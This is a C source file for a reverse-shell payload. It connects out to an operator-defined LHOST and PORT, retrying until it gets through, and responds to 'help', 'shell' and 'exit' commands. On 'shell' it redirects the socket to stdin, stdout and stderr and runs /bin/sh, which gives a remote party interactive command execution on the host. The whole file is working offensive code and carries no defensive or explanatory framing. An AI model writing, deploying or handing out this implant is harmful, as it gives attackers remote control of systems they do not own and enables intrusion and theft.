#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>

#include "payload_common.h"

#define MAXBUF 65536

int main(void)
{
	int connection_established;
	char* ip = LHOST;
	int port = PORT;
	int n = 0;
	char buf[MAXBUF];

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	do {
		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
	} while(connection_established != 0);

	write(sock, MSG_HELLO, strlen(MSG_HELLO));

	while (connection_established == 0)
	{
		while((n = read(sock, buf, MAXBUF)) > 0)
		{
			// TODO: Revamp argument parsing (there's a better way! :)
			if(strncmp(buf, "help\n", 5) == 0)
			{
				write(sock, MSG_HELP, strlen(MSG_HELP));
			}

			else if(strncmp(buf, "shell\n", 6) == 0)
			{

				int status = 0;
				pid_t wpid, child_pid;

				char* const argv[] = {"/bin/sh", NULL};
				if((child_pid = fork()) == 0)
				{
					char shell_msg[50];
					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
					write(sock, shell_msg, strlen(shell_msg));

					dup2(sock, 0);
					dup2(sock, 1);
					dup2(sock, 2);
					// Create a child process and start shell inside of it
					execve("/bin/sh", argv, NULL);
					exit(EXIT_SUCCESS);
				}
				// Make the parent process wait for child process to terminate
				while ((wpid = wait(&status)) > 0);     

				write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
			}

			else if(strncmp(buf, "exit\n", 5) == 0)
			{
				write(sock, MSG_EXIT_CMD, strlen(MSG_EXIT_CMD));
				exit(EXIT_SUCCESS);
			}

			else
			{
				write(sock, MSG_INVALID, strlen(MSG_INVALID));
			}		
		}
	}

	return 0;
}
